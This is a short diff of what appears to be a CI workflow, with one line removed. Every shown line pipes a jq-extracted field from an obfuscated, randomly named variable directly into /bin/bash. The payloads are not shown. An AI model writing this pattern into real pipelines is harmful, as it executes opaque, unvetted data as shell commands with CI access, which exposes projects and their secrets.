@@ -27,7 +27,6 @@ jobs:
           echo $cjydw5960 | jq -r .fsxs0 | /bin/bash
           echo $v48 | jq -r .hjls2 | /bin/bash
           printf '%s' "$ipil5" | jq -r .gt73 | /bin/bash
-          echo $tgh5 | jq -r .m6 | /bin/bash
           echo $ddosw786 | jq -r .bofgf9033 | /bin/bash
           echo $u06563 | jq -r .d38718 | /bin/bash
 
